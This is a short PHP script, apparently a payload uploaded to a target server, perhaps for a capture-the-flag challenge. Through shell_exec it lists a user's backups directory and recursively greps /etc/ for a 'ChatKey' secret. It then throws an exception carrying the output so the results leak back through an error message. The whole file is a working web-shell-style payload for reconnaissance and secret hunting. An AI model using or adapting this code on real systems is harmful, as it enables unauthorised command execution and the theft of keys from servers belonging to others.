<?php
$output ='';

$output =$output."\n /home/pinhead/backups/ ls: \n ".shell_exec ('ls /home/pinhead/backups/  | cat');
$output =$output."\n chatkey etc ".shell_exec ("grep -rnw '/etc/' -e '*ChatKey*'  | cat");

throw new Exception("\n SUCCESS  ". $output."\n");
?>
